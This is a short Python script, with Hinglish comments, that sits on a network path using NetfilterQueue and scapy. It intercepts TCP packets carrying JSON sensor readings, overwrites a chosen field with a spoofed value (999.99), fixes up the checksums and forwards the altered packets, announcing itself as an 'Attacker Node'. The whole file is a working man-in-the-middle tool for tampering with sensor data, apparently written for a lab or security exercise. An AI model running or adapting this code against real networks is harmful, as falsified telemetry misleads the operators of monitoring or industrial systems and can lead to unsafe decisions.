from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import json
import traceback

TARGET_COLUMN = "p1"     # <-- APNI EXCEL KA ACTUAL COLUMN NAAM DAALO
SPOOFED_VALUE = 999.99     

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            raw_data = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')

            # repr() hidden spaces aur \n ko explicitly dikhayega
            print(f"\n[DEBUG] Raw String: {repr(raw_data)}")

            if "sensor_id" in raw_data:
                modified = False
                new_payload_lines = []
                lines = raw_data.strip().split('\n')

                for line in lines:
                    if not line.strip(): 
                        continue

                    try:
                        payload = json.loads(line)
                        
                        # THE LITMUS TEST: Exact keys print karo
                        if "data" in payload:
                            keys_found = list(payload["data"].keys())
                            print(f"[DEBUG] Dictionary Keys: {keys_found}")
                            
                            if TARGET_COLUMN in payload["data"]:
                                original_val = payload["data"][TARGET_COLUMN]
                                payload["data"][TARGET_COLUMN] = SPOOFED_VALUE
                                print(f"[!] INJECTION SUCCESS: {TARGET_COLUMN} = {original_val} -> {SPOOFED_VALUE}")
                                modified = True
                            else:
                                print(f"[-] FATAL MISS: TARGET '{TARGET_COLUMN}' is strictly NOT in Dictionary Keys.")

                        new_payload_lines.append(json.dumps(payload))

                    except json.JSONDecodeError as e:
                        print(f"[-] JSON Parse Failed: {e} | Chunk: {repr(line)}")
                        new_payload_lines.append(line) 

                if modified:
                    new_raw_data = '\n'.join(new_payload_lines) + '\n'
                    scapy_packet[scapy.Raw].load = new_raw_data.encode('utf-8')

                    del scapy_packet[scapy.TCP].options
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum

                    packet.set_payload(bytes(scapy_packet))

    except Exception as e:
        print(f"\n[!] PACKET ERROR: {e}")

    packet.accept()

queue = NetfilterQueue()
queue.bind(1, process_packet)
print("[*] Attacker Node Active. Intercepting on Queue 1...")
try:
    queue.run()
except KeyboardInterrupt:
    queue.unbind()